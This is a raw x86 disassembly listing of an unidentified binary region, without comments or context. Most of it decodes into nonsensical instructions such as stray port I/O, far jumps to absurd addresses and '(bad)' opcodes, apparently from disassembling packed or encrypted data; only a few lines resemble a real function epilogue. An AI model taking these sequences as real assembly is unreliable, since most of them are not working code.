  40b075:	jecxz  0x40b046
  40b077:	repnz ds out 0xe5,eax
  40b07b:	popa   
  40b07c:	push   edx
  40b07d:	cmp    al,0xe7
  40b07f:	or     esi,DWORD PTR [ebx-0xa]
  40b082:	gs in  eax,0x95
  40b085:	cli    
  40b086:	or     DWORD PTR [esi-0x2a51f315],eax
  40b08c:	sahf   
  40b08d:	mov    edi,0x9bd0cd31
  40b092:	and    al,0xe3
  40b094:	mov    ebp,0x3a87ab4b
  40b099:	adc    DWORD PTR [ebx+ecx*1+0x43a64017],edx
  40b0a0:	rcr    ch,0x36
  40b0a3:	in     eax,dx
  40b0a4:	sub    eax,0x41f02575
  40b0a9:	rol    esp,1
  40b0ab:	sbb    DWORD PTR [ebx-0x9621ff5],ecx
  40b0b1:	jb     0x40b123
  40b0b3:	mul    BYTE PTR [ebx-0x5a]
  40b0b6:	jecxz  0x40b0be
  40b0b8:	shl    DWORD PTR [ecx],0xf8
  40b0bb:	jne    0x40b060
  40b0bd:	sub    BYTE PTR [ebx+0x29faed6d],0xfd
  40b0c4:	daa    
  40b0c5:	int3   
  40b0c6:	div    DWORD PTR [ebp+0x762c76e3]
  40b0cc:	xor    cl,BYTE PTR [esi-0x1]
  40b0cf:	mov    ebp,0x6e992151
  40b0d4:	inc    esi
  40b0d5:	dec    ebp
  40b0d6:	sbb    ecx,ebx
  40b0d8:	idiv   DWORD PTR [eax+eax*1+0x4a12b872]
  40b0df:	sub    eax,ebx
  40b0e1:	in     eax,dx
  40b0e2:	cld    
  40b0e3:	sbb    ah,BYTE PTR [ebx]
  40b0e5:	fldenv [eax]
  40b0e7:	pop    ebx
  40b0e8:	jle    0x40b126
  40b0ea:	xchg   esp,eax
  40b0eb:	pop    ss
  40b0ec:	jns    0x40b150
  40b0ee:	in     al,dx
  40b0ef:	stos   DWORD PTR es:[edi],eax
  40b0f0:	mov    ch,0x8d
  40b0f2:	test   eax,0x88c28d04
  40b0f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0f8:	sub    DWORD PTR [eax],esi
  40b0fa:	cmp    al,0xbb
  40b0fc:	dec    ebx
  40b0fd:	jle    0x40b09c
  40b0ff:	outs   dx,BYTE PTR ds:[esi]
  40b100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b101:	adc    BYTE PTR [ebx+0x62f1d1da],al
  40b107:	shr    BYTE PTR ds:[ebx+edx*4],0xf5
  40b10c:	fsubr  DWORD PTR [esi]
  40b10e:	sub    dh,BYTE PTR [eax+eax*2-0x66]
  40b112:	sub    BYTE PTR [esi-0x16],ah
  40b115:	or     al,0x3e
  40b117:	push   ss
  40b118:	inc    esp
  40b119:	ficomp DWORD PTR [ebx+0x63]
  40b11c:	push   edx
  40b11d:	mov    ah,0xc4
  40b11f:	rcr    BYTE PTR [edi],cl
  40b121:	push   ds
  40b122:	xor    al,al
  40b124:	pop    edi
  40b125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b127:	loope  0x40b14c
  40b129:	sbb    ebp,DWORD PTR ds:0x925f7890
  40b12f:	fistp  DWORD PTR [ecx-0x575efcf5]
  40b135:	xchg   BYTE PTR [esi+0x5daa9494],dl
  40b13b:	fld    QWORD PTR [ecx]
  40b13d:	mov    edi,cs
  40b13f:	cmp    BYTE PTR [ecx+0x14],ah
  40b142:	pushf  
  40b143:	sub    bl,dl
  40b145:	enter  0xf0ad,0x8f
  40b149:	fwait
  40b14a:	mov    ch,0x42
  40b14c:	sbb    BYTE PTR [edx-0x5d],bl
  40b14f:	inc    ecx
  40b150:	outs   dx,DWORD PTR ds:[esi]
  40b151:	push   edi
  40b152:	test   DWORD PTR [esi+0x60856a5e],0x6c34316b
  40b15c:	sbb    ax,0x3dae
  40b160:	fmulp  st(0),st
  40b162:	in     eax,0x40
  40b164:	push   esi
  40b165:	add    edx,esi
  40b167:	xor    ebp,ebx
  40b169:	popf   
  40b16a:	aad    0x6a
  40b16c:	es mov ah,0x67
  40b16f:	addr16 iret 
  40b171:	dec    edx
  40b172:	or     eax,0x9934484d
  40b177:	lea    ecx,[edx-0x23]
  40b17a:	das    
  40b17b:	cmc    
  40b17c:	push   eax
  40b17d:	shl    BYTE PTR [eax+0x6534bcb3],1
  40b183:	inc    edx
  40b184:	inc    ebx
  40b185:	loopne 0x40b17b
  40b187:	push   ecx
  40b188:	les    ebp,FWORD PTR [esp+ecx*2+0x5564ab3f]
  40b18f:	fdivr  QWORD PTR [ebp-0x7b]
  40b192:	mov    eax,0x795ff90b
  40b197:	popf   
  40b198:	arpl   WORD PTR [ecx+0x78],bx
  40b19b:	sub    bh,BYTE PTR [ebp-0x5d4e6c04]
  40b1a1:	loopne 0x40b184
  40b1a3:	loopne 0x40b12a
  40b1a5:	dec    edx
  40b1a6:	mov    edx,0x7db3d3c4
  40b1ab:	(bad)  
  40b1ac:	xchg   ebp,eax
  40b1ad:	sub    ecx,DWORD PTR [ecx-0x53567615]
  40b1b3:	inc    esi
  40b1b4:	sbb    DWORD PTR [esp+eax*4+0x6caa4d9f],esi
  40b1bb:	fidiv  WORD PTR [edi-0x4a]
  40b1be:	jno    0x40b197
  40b1c0:	sub    DWORD PTR [ecx+0x16c8a24a],eax
  40b1c6:	sub    eax,DWORD PTR [edi-0x37f50548]
  40b1cc:	push   ebp
  40b1cd:	lds    edx,FWORD PTR [edi]
  40b1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d0:	loop   0x40b229
  40b1d2:	adc    al,0xe7
  40b1d4:	sbb    eax,0xbf8a3041
  40b1d9:	js     0x40b258
  40b1db:	hlt    
  40b1dc:	outs   dx,BYTE PTR ds:[esi]
  40b1dd:	xor    BYTE PTR [ecx+eiz*2],bl
  40b1e0:	cmp    eax,DWORD PTR [edi+0x51]
  40b1e3:	nop
  40b1e4:	xchg   ebx,eax
  40b1e5:	fiadd  WORD PTR [edi+0x39435dfc]
  40b1eb:	addr16 xchg ebx,eax
  40b1ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1ee:	mov    DWORD PTR [ebx],eax
  40b1f0:	cmp    bl,ch
  40b1f2:	hlt    
  40b1f3:	fcomp  DWORD PTR [ebx-0x33c44c92]
  40b1f9:	jnp    0x40b18d
  40b1fb:	sub    al,0xbe
  40b1fd:	and    eax,0x727cd842
  40b202:	mov    ds:0xd4862e0f,eax
  40b207:	dec    edx
  40b208:	dec    edi
  40b209:	or     cl,BYTE PTR [eax]
  40b20b:	fistp  QWORD PTR [ecx+0x49]
  40b20e:	cmp    ecx,DWORD PTR [esi+0x2e45c004]
  40b214:	lock addr16 mov esp,0x16652d1b
  40b21b:	js     0x40b1e9
  40b21d:	dec    ebx
  40b21e:	sahf   
  40b21f:	in     al,dx
  40b220:	cmp    esi,DWORD PTR [edx]
  40b222:	push   ebx
  40b223:	sbb    bh,al
  40b225:	pusha  
  40b226:	add    esi,DWORD PTR [edx]
  40b228:	pop    esp
  40b229:	pusha  
  40b22a:	cmp    al,0x4d
  40b22c:	dec    ebp
  40b22d:	or     al,0xa9
  40b22f:	imul   BYTE PTR [ebp-0x2d9215b6]
  40b235:	pop    ds
  40b236:	test   eax,0x8b267ef7
  40b23b:	jle    0x40b1f1
  40b23d:	mov    DWORD PTR [ebp+0x5e],ecx
  40b240:	imul   ebp,DWORD PTR [ebx+0x4249ede1],0x73e443fd
  40b24a:	lds    esi,FWORD PTR [ecx+0x27]
  40b24d:	mov    eax,ds:0x2fae7d5f
  40b252:	ins    DWORD PTR es:[edi],dx
  40b253:	lea    esi,[edi]
  40b255:	(bad)  
  40b256:	call   0xbdf9bbfa
  40b25b:	jge    0x40b1e5
  40b25d:	imul   edx,DWORD PTR [ebp+0x14],0x9298c794
  40b264:	sbb    bl,dh
  40b266:	or     BYTE PTR [esi+0x18],cl
  40b269:	adc    BYTE PTR [ebx-0x53d7e8b],0x17
  40b270:	out    0x2,eax
  40b272:	retf   0x6ea2
  40b275:	dec    ecx
  40b276:	xor    dh,BYTE PTR [esi+edx*2+0x7]
  40b27a:	adc    ch,dh
  40b27c:	fwait
  40b27d:	outs   dx,BYTE PTR ds:[esi]
  40b27e:	sub    bl,dh
  40b280:	mov    bh,cl
  40b282:	out    0xa6,eax
  40b284:	pop    ecx
  40b285:	inc    ebp
  40b286:	sar    BYTE PTR [edx-0x4dc5b456],0xdf
  40b28d:	jo     0x40b25d
  40b28f:	and    DWORD PTR [ebp+0x48],ebx
  40b292:	imul   eax,DWORD PTR [esi+0x8],0xffffffbc
  40b296:	jmp    0x40b2f8
  40b298:	pop    ecx
  40b299:	ins    BYTE PTR es:[edi],dx
  40b29a:	test   BYTE PTR [ebx],bh
  40b29c:	and    BYTE PTR ss:[esi+0xa],0xad
  40b2a1:	add    eax,0xb040ffa5
  40b2a6:	out    dx,eax
  40b2a7:	and    edx,ecx
  40b2a9:	and    al,0x3d
  40b2ab:	loope  0x40b2d7
  40b2ad:	pop    es
  40b2ae:	mov    al,0x7b
  40b2b0:	scas   eax,DWORD PTR es:[edi]
  40b2b1:	or     DWORD PTR [edi+0x41],esi
  40b2b4:	adc    DWORD PTR [ecx*8+0x3de52f1d],esi
  40b2bb:	jbe    0x40b337
  40b2bd:	xchg   edx,eax
  40b2be:	sub    cl,0x14
  40b2c1:	add    eax,DWORD PTR [eax]
  40b2c3:	add    dl,dl
  40b2c5:	rol    ah,0xc9
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0xc51b132
  40b2d2:	ret    0xce39
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	imul   dh
  40b2de:	out    dx,eax
  40b2df:	stc    
  40b2e0:	(bad)  
  40b2e2:	and    BYTE PTR [ebp+0x1c],ch
  40b2e5:	sub    ch,BYTE PTR ds:0x8cf600d1
  40b2eb:	or     ecx,DWORD PTR ds:0x6abc892c
  40b2f1:	mov    dl,0x28
  40b2f3:	sbb    eax,0x3f381639
  40b2f8:	data16 das 
  40b2fa:	sahf   
  40b2fb:	repnz xchg esi,eax
  40b2fd:	sbb    DWORD PTR [ecx+0x62],0x9132b8f1
  40b304:	cmc    
  40b305:	in     eax,0x46
  40b307:	inc    ebp
  40b308:	test   al,0x3c
  40b30a:	pop    es
  40b30b:	adc    DWORD PTR [edi-0x62c523e2],ebx
  40b311:	imul   eax,DWORD PTR [ebp+0x6d4fbef8],0xffffffef
  40b318:	push   ecx
  40b319:	lock fiadd DWORD PTR [ebx+eiz*4]
  40b31d:	inc    eax
  40b31e:	scas   eax,DWORD PTR es:[edi]
  40b31f:	data16 jno 0x40b307
  40b322:	sbb    BYTE PTR [eax+ecx*2+0xa15279],0x6a
  40b32a:	mov    bl,0x7
  40b32c:	int    0x64
  40b32e:	mov    WORD PTR [esi],ds
  40b330:	and    ebp,DWORD PTR [ecx]
  40b332:	scas   eax,DWORD PTR es:[edi]
  40b333:	fdivr  QWORD PTR [esi+0x35]
  40b336:	mov    cl,BYTE PTR [ecx]
  40b338:	pop    ss
  40b339:	addr16 loopne 0x40b2e1
  40b33c:	inc    ebx
  40b33d:	add    eax,0x5ec01c55
  40b342:	push   ebp
  40b343:	pop    ss
  40b344:	xchg   DWORD PTR [eax+0x5f],eax
  40b347:	jp     0x40b3a3
  40b349:	add    eax,0xd4ea1e98
  40b34e:	mov    al,ds:0x89efc893
  40b353:	jg     0x40b319
  40b355:	push   edi
  40b356:	and    cl,BYTE PTR [ebp+0x51]
  40b359:	xor    BYTE PTR [eax],ah
  40b35b:	in     al,dx
  40b35c:	mov    dh,0xb7
  40b35e:	cld    
  40b35f:	sub    al,0xde
  40b361:	mov    bl,0xd7
  40b363:	es lahf 
  40b365:	ror    BYTE PTR [esi+0x286d8f0d],1
  40b36b:	xor    DWORD PTR [ecx],esi
  40b36d:	push   edi
  40b36e:	andnps xmm7,XMMWORD PTR [edi]
  40b371:	rol    DWORD PTR [esi+0x3bf59e05],0xf2
  40b378:	cdq    
  40b379:	jp     0x40b308
  40b37b:	aam    0xa8
  40b37d:	push   0x1aec0944
  40b382:	mov    ah,0xa2
  40b384:	xor    dl,cl
  40b386:	das    
  40b387:	add    ecx,edx
  40b389:	scas   eax,DWORD PTR es:[edi]
  40b38a:	sbb    al,0x7d
  40b38c:	jp     0x40b329
  40b38e:	jns    0x40b3c3
  40b390:	xchg   ebx,eax
  40b391:	aam    0x17
  40b393:	int3   
  40b394:	or     BYTE PTR es:[esi+ecx*2+0x50],ch
  40b399:	xchg   edi,eax
  40b39a:	and    esp,DWORD PTR [ebp+edx*2+0x5a]
  40b39e:	fs jbe 0x40b3dd
  40b3a1:	xor    ebx,DWORD PTR [esi-0x34]
  40b3a4:	pushf  
  40b3a5:	repnz sti 
  40b3a7:	dec    ecx
  40b3a8:	and    eax,0xd802d148
  40b3ad:	sub    edx,DWORD PTR [esi]
  40b3af:	cld    
  40b3b0:	shl    DWORD PTR [ebx],1
  40b3b2:	enter  0x471c,0x64
  40b3b6:	je     0x40b39e
  40b3b8:	push   ebp
  40b3b9:	pop    ebx
  40b3ba:	sbb    BYTE PTR [edi+0x57290443],0x9e
  40b3c1:	ds mov ch,0x1d
  40b3c4:	cmp    DWORD PTR [edx+0x6ba3bebb],edx
  40b3ca:	pop    ebp
  40b3cb:	inc    ebx
  40b3cc:	cmp    BYTE PTR [eax],cl
  40b3ce:	dec    bp
  40b3d0:	push   esi
  40b3d1:	aas    
  40b3d2:	mov    bh,0xb0
  40b3d4:	sbb    edx,esp
  40b3d6:	nop
  40b3d7:	jnp    0x40b41d
  40b3d9:	clc    
  40b3da:	sub    ah,BYTE PTR [edi+0x2e]
  40b3dd:	push   edi
  40b3de:	xchg   esi,eax
  40b3df:	enter  0xadd7,0xb3
  40b3e3:	mov    esi,0x90d7acd
  40b3e8:	sub    ah,al
  40b3ea:	fisubr DWORD PTR [eax+0x38de10e8]
  40b3f0:	mov    esi,ebx
  40b3f2:	ret    
  40b3f3:	outs   dx,DWORD PTR ds:[esi]
  40b3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3f5:	or     BYTE PTR [esi-0x3c],dh
  40b3f8:	sbb    DWORD PTR [edi+0x6583a94b],0x39
  40b3ff:	adc    al,0x91
  40b401:	test   BYTE PTR [edx-0x3f],ch
  40b404:	mov    ebp,0x3b801ce8
  40b409:	fucomi st,st(2)
  40b40b:	push   edx
  40b40c:	xchg   esi,eax
  40b40d:	out    dx,al
  40b40e:	sbb    edx,ebx
  40b410:	idiv   BYTE PTR [esi]
  40b412:	jmp    DWORD PTR [eax-0x3e]
  40b415:	jl     0x40b46c
  40b417:	inc    DWORD PTR [esp+edx*4+0x73]
  40b41b:	mov    edx,ds
  40b41d:	in     eax,dx
  40b41e:	inc    esp
  40b41f:	mov    eax,0xd08b510c
  40b424:	pusha  
  40b425:	mov    dl,0x5f
  40b427:	fsub   DWORD PTR [ecx-0x3a996206]
  40b42d:	(bad)  
  40b42e:	(bad)  
  40b42f:	imul   edx,DWORD PTR [ebx],0x72cad045
  40b435:	sahf   
  40b436:	addr16 out dx,al
  40b438:	aam    0xd3
  40b43a:	fldenv [ecx]
  40b43c:	jmp    0x40b3cd
  40b43e:	fstp   DWORD PTR [ebp*8+0x7d13b6a1]
  40b445:	add    DWORD PTR [ebx],esi
  40b447:	jmp    0x40b3d2
  40b449:	pop    edx
  40b44a:	out    dx,eax
  40b44b:	mov    ah,0x23
  40b44d:	js     0x40b40d
  40b44f:	xlat   BYTE PTR ds:[ebx]
  40b450:	iret   
  40b451:	icebp  
  40b452:	out    0xf3,al
  40b454:	ret    0xa49
  40b457:	mov    bl,ch
  40b459:	pop    eax
  40b45a:	push   eax
  40b45b:	popa   
  40b45c:	call   0xa7b6:0xa6288537
  40b463:	cmp    DWORD PTR [esi-0x613a2d2b],eax
  40b469:	ficom  DWORD PTR [ebp+0x1a057b13]
  40b46f:	pop    es
  40b470:	push   es
  40b471:	lahf   
  40b472:	or     eax,DWORD PTR [esp+eax*8]
  40b475:	mov    eax,0x7e5d6ba6
  40b47a:	icebp  
  40b47b:	xchg   DWORD PTR [edx+0x2feb9e79],ecx
  40b481:	sbb    al,0x3
  40b483:	pushf  
  40b484:	lods   al,BYTE PTR ds:[esi]
  40b485:	js     0x40b49e
  40b487:	mov    eax,ds:0x6f761f62
  40b48c:	sub    DWORD PTR [edi],eax
  40b48e:	aam    0x47
  40b490:	test   al,0x6b
  40b492:	rcr    ah,0x96
  40b495:	dec    ebp
  40b496:	sahf   
  40b497:	rol    BYTE PTR ds:0xd59440e1,1
  40b49d:	jb     0x40b4c2
  40b49f:	aaa    
  40b4a0:	mov    esp,0x958a01ac
  40b4a5:	inc    eax
  40b4a6:	push   edi
  40b4a7:	pusha  
  40b4a8:	and    al,0x32
  40b4aa:	inc    eax
  40b4ab:	mov    esp,0x432f660b
  40b4b0:	cli    
  40b4b1:	in     al,dx
  40b4b2:	imul   esi,DWORD PTR [ebp+0xd603bbe],0xa5988d8c
  40b4bc:	mov    edi,0x888e22c5
  40b4c1:	(bad)  
  40b4c2:	in     al,0x9c
  40b4c4:	fdivr  QWORD PTR [esp+eax*1-0x694872f6]
  40b4cb:	in     al,dx
  40b4cc:	push   0xe645f645
  40b4d1:	jge    0x40b548
  40b4d3:	fsub   st(2),st
  40b4d5:	pusha  
  40b4d6:	push   edi
  40b4d7:	aam    0x1b
  40b4d9:	mov    ebp,0x81e0e8e9
  40b4de:	test   BYTE PTR [ebx],bl
  40b4e0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40b4e2:	pop    edx
  40b4e3:	xchg   ebp,eax
  40b4e4:	out    0xc1,eax
  40b4e6:	inc    edx
  40b4e7:	add    al,0x2c
  40b4e9:	std    
  40b4ea:	or     DWORD PTR [eax-0x67],edi
  40b4ed:	inc    esp
  40b4ee:	(bad)  
  40b4ef:	sbb    dh,al
  40b4f1:	sti    
  40b4f2:	xchg   BYTE PTR [ebx-0x5f],ch
  40b4f5:	std    
  40b4f6:	aad    0xf3
  40b4f8:	gs popf 
  40b4fa:	push   es
  40b4fb:	div    BYTE PTR [edx-0x80]
  40b4fe:	jne    0x40b50d
  40b500:	push   eax
  40b501:	mov    bl,0xa9
  40b503:	ja     0x40b503
  40b505:	lods   eax,DWORD PTR ds:[esi]
  40b506:	lds    ebx,FWORD PTR [edi]
  40b508:	and    DWORD PTR [ecx],ebx
  40b50a:	arpl   WORD PTR [ecx+0x33ffcca2],bx
  40b510:	jne    0x40b574
  40b512:	cmp    al,0x22
  40b514:	ror    edx,cl
  40b516:	bound  ebp,QWORD PTR [edi]
  40b518:	jge    0x40b4c5
  40b51a:	dec    edi
  40b51b:	dec    edi
  40b51c:	dec    esp
  40b51d:	xor    eax,0x8992249a
  40b522:	hlt    
  40b523:	rcr    ah,0x9d
  40b526:	jle    0x40b532
  40b528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b529:	xchg   edi,eax
  40b52a:	imul   esi,DWORD PTR [esi+0x52cb099c],0xffffffab
  40b531:	je     0x40b544
  40b533:	dec    ebx
  40b534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b535:	repz ja 0x40b599
  40b538:	xchg   ebx,eax
  40b539:	xchg   BYTE PTR [ebx+0x5e],ch
  40b53c:	out    dx,al
  40b53d:	pop    es
  40b53e:	add    al,0xd3
  40b540:	pop    ebp
  40b541:	or     eax,0xd75e5681
  40b546:	mov    bl,0x12
  40b548:	mov    dh,0xa
  40b54a:	jg     0x40b50c
  40b54c:	or     bl,cl
  40b54e:	xchg   edx,eax
  40b54f:	xlat   BYTE PTR ds:[ebx]
  40b550:	stos   BYTE PTR es:[edi],al
  40b551:	sub    edx,DWORD PTR [edi-0x52195679]
  40b557:	(bad)  
  40b558:	clc    
  40b559:	gs jne 0x40b51e
  40b55c:	push   ebp
  40b55d:	fs jmp 0x298cc65d
  40b563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b564:	nop
  40b565:	retf   
  40b566:	or     ecx,DWORD PTR [edi+0x6e]
  40b569:	int3   
  40b56a:	and    BYTE PTR ds:0xf0687e82,0x1d
  40b571:	cmp    DWORD PTR [ecx+0x7b],0x6423522d
  40b578:	inc    eax
  40b579:	ret    0x33ba
  40b57c:	loop   0x40b52b
  40b57e:	in     al,dx
  40b57f:	iret   
  40b580:	xchg   ebp,eax
  40b581:	pushf  
  40b582:	out    dx,al
  40b583:	(bad)  
  40b584:	and    ah,BYTE PTR [ecx+0x3203ae2b]
  40b58a:	dec    ecx
  40b58b:	sti    
  40b58c:	and    ebx,DWORD PTR [ebx-0x4b]
  40b58f:	retf   0xc201
  40b592:	inc    eax
  40b593:	or     ah,BYTE PTR [ecx]
  40b595:	lahf   
  40b596:	and    dh,ch
  40b598:	pop    esp
  40b599:	and    cl,bh
  40b59b:	and    eax,0x7047e5d5
  40b5a0:	inc    esp
  40b5a1:	ins    BYTE PTR es:[edi],dx
  40b5a2:	scas   eax,DWORD PTR es:[edi]
  40b5a3:	sbb    dh,BYTE PTR [edi+0x64]
  40b5a6:	xchg   ebp,eax
  40b5a7:	or     ch,BYTE PTR [esi-0x203f3123]
  40b5ad:	or     eax,esp
  40b5af:	aad    0x25
  40b5b1:	ficom  DWORD PTR [ebx+0x1f85e7ed]
  40b5b7:	retf   0xf0a3
  40b5ba:	cdq    
  40b5bb:	scas   eax,DWORD PTR es:[edi]
  40b5bc:	addr16 mov esi,0xa3995c0b
  40b5c2:	fwait
  40b5c3:	fwait
  40b5c4:	push   DWORD PTR [ebx+ebx*8]
  40b5c7:	push   esi
  40b5c8:	ins    DWORD PTR es:[edi],dx
  40b5c9:	ret    0xfc19
  40b5cc:	pop    esi
  40b5cd:	sahf   
  40b5ce:	adc    al,0xb3
  40b5d0:	adc    DWORD PTR [ebp+0xc574efb],eax
  40b5d6:	test   al,0x5f
  40b5d8:	je     0x40b5f5
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi-0x33332a7c]
  40b60d:	sbb    BYTE PTR gs:[edx+ecx*8],bh
  40b611:	(bad)  
  40b612:	js     0x40b68c
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	inc    ecx
  40b619:	add    cl,BYTE PTR [ebp-0x4baf7ba4]
  40b61f:	or     bh,dh
  40b621:	inc    edi
  40b622:	call   0x2675:0xdc713d49
  40b629:	mov    ecx,0x613244f7
  40b62e:	push   edi
  40b62f:	xchg   ebp,eax
  40b630:	out    0xa7,al
  40b632:	mov    ds,WORD PTR [eax]
  40b634:	mov    ds:0x81b2727e,al
  40b639:	shr    DWORD PTR [esi+edx*8],0x5b
  40b63d:	mov    ecx,ebx
  40b63f:	mov    es,WORD PTR [edx]
  40b641:	neg    DWORD PTR [ebp-0x7c20293c]
  40b647:	lock xlat BYTE PTR ds:[ebx]
  40b649:	mov    dl,0xc3
  40b64b:	sahf   
  40b64c:	mov    ah,0x13
  40b64e:	fdivr  st(5),st
  40b650:	cs and cl,dl
  40b653:	repnz and eax,0x4fc6985
  40b659:	or     eax,0xf21d18bb
  40b65e:	and    al,0xf3
  40b660:	shl    BYTE PTR [edi],0xf0
  40b663:	mov    ah,0xe
  40b665:	mov    ebx,0xac12e9d8
  40b66a:	fnstcw WORD PTR [edx-0x1]
  40b66d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b66e:	fisub  DWORD PTR [ebx]
  40b670:	xor    BYTE PTR [edi],bh
  40b672:	or     BYTE PTR [edx],dh
  40b674:	rcr    BYTE PTR [edi+0x3babea82],cl
  40b67a:	outs   dx,BYTE PTR ds:[esi]
  40b67b:	add    eax,0xcb80e171
  40b680:	inc    edi
  40b681:	pop    ds
  40b682:	fiadd  DWORD PTR [ebx]
  40b684:	jo     0x40b61a
  40b686:	(bad)  
  40b687:	ret    0x17d3
  40b68a:	dec    ebp
  40b68b:	iret   
  40b68c:	adc    BYTE PTR [edi-0x20],dl
  40b68f:	popf   
  40b690:	sub    BYTE PTR [eax-0x504e0558],dl
  40b696:	lea    ecx,[edx+0x37e76fcc]
  40b69c:	shl    BYTE PTR [esi],cl
  40b69e:	stos   DWORD PTR es:[edi],eax
  40b69f:	cmc    
  40b6a0:	les    ebp,FWORD PTR [esi-0x5ef701ee]
  40b6a6:	enter  0x707f,0x3d
  40b6aa:	push   eax
  40b6ab:	jmp    0x40b6e6
  40b6ad:	mov    edi,0x3cb47192
  40b6b2:	or     BYTE PTR [edx],ch
  40b6b4:	inc    ecx
  40b6b5:	rcr    BYTE PTR ds:0x13d5b431,cl
  40b6bb:	mov    ebx,0x98b1ba6b
  40b6c0:	rcl    BYTE PTR [ebx],cl
  40b6c2:	push   eax
  40b6c3:	(bad)  
  40b6c5:	xor    eax,0x7d11c170
  40b6ca:	mov    al,ds:0x2668871e
  40b6cf:	inc    eax
  40b6d0:	mov    edx,0x94ea44a4
  40b6d5:	out    dx,al
  40b6d6:	or     al,0x61
  40b6d8:	pop    edx
  40b6d9:	hlt    
  40b6da:	or     edi,ecx
  40b6dc:	ss int3 
  40b6de:	int3   
  40b6df:	mov    ds:0x2eb73722,eax
  40b6e4:	jecxz  0x40b716
  40b6e6:	rol    DWORD PTR [eax-0x49],cl
  40b6e9:	cld    
  40b6ea:	mov    cl,0xfb
  40b6ec:	and    al,0xf4
  40b6ee:	jmp    0x40b6f1
  40b6f0:	ja     0x40b715
  40b6f2:	adc    BYTE PTR ds:0xed23a5a,ch
  40b6f8:	(bad)
  40b6fb:	dec    eax
  40b6fc:	das    
  40b6fd:	pop    esi
  40b6fe:	shr    DWORD PTR [esi+0x1d696288],0x2d
  40b705:	das    
  40b706:	jne    0x40b6ed
  40b708:	inc    ecx
  40b709:	push   edx
  40b70a:	pop    edx
  40b70b:	test   eax,0xecc623b8
  40b710:	or     al,0xc
  40b712:	sub    eax,0x2f8f90bb
  40b717:	cs jg  0x40b722
  40b71a:	xchg   esi,eax
  40b71b:	push   0xffffffaa
  40b71d:	test   al,0x3b
  40b71f:	cmp    ebx,esp
  40b721:	gs aaa 
  40b723:	jno    0x40b71c
  40b725:	mov    esi,0x1797d730
  40b72a:	div    ebx
  40b72c:	clc    
  40b72d:	push   esp
  40b72e:	jmp    FWORD PTR [edi+0x461800fe]
  40b734:	or     cl,al
  40b736:	inc    esi
  40b737:	add    DWORD PTR [eax+eiz*2],ebx
  40b73a:	jno    0x40b7b1
  40b73c:	inc    ebp
  40b73d:	test   BYTE PTR [ebp+0x14420cd5],0xa3
  40b744:	or     al,0x67
  40b746:	rcl    BYTE PTR [ebx-0x4a],0x15
  40b74a:	das    
  40b74b:	push   esi
  40b74c:	ins    DWORD PTR es:[edi],dx
  40b74d:	mov    ch,0x35
  40b74f:	push   edi
  40b750:	push   0x77
  40b752:	aam    0xdb
  40b754:	and    cl,ah
  40b756:	fst    DWORD PTR [ebp-0x3f1ff3d6]
  40b75c:	cmp    DWORD PTR [eax+0x34ea1fb0],ebp
  40b762:	je     0x40b730
  40b764:	pop    esp
  40b765:	mov    WORD PTR [ebp-0x66],cs
  40b768:	fld    QWORD PTR [ebp-0x539448df]
  40b76e:	fwait
  40b76f:	push   0x5a32740e
  40b774:	and    ah,BYTE PTR [eax]
  40b776:	sbb    DWORD PTR [ebx+0xeabd587],ebp
  40b77c:	inc    edi
  40b77d:	sub    ebx,esp
  40b77f:	daa    
  40b780:	cwde   
  40b781:	jbe    0x40b7b8
  40b783:	xchg   ebx,esp
  40b785:	rcl    DWORD PTR [edx+0x48],cl
  40b788:	mov    BYTE PTR [edi+0x7f],dh
  40b78b:	pop    ecx
  40b78c:	pop    edx
  40b78d:	popf   
  40b78e:	pop    edx
  40b78f:	dec    edx
  40b790:	mov    ah,0x43
  40b792:	out    0x5c,eax
  40b794:	pusha  
  40b795:	retf   0xd2ab
  40b798:	fcom   DWORD PTR [ebx+0x4f]
  40b79b:	scas   eax,DWORD PTR es:[edi]
  40b79c:	push   edx
  40b79d:	jmp    0xaed838d5
  40b7a2:	add    BYTE PTR [edi],dh
  40b7a4:	adc    edx,esp
  40b7a6:	sbb    eax,0xf156ccbf
  40b7ab:	sub    al,0x7a
  40b7ad:	div    DWORD PTR [ecx-0x6c0567c0]
  40b7b3:	xchg   ebx,eax
  40b7b4:	push   ecx
  40b7b5:	sti    
  40b7b6:	les    esp,FWORD PTR [ecx+0x5b]
  40b7b9:	test   DWORD PTR [edi+ecx*8+0x50],ebx
  40b7bd:	or     bh,BYTE PTR [ecx+0x28]
  40b7c0:	fmul   DWORD PTR [ecx-0x7e]
  40b7c3:	js     0x40b7f2
  40b7c5:	dec    esp
  40b7c6:	jl     0x40b7b5
  40b7c8:	sub    al,al
  40b7ca:	popf   
  40b7cb:	sub    DWORD PTR [ebx-0x30],edi
  40b7ce:	scas   eax,DWORD PTR es:[edi]
  40b7cf:	cmp    eax,0x3aa686f3
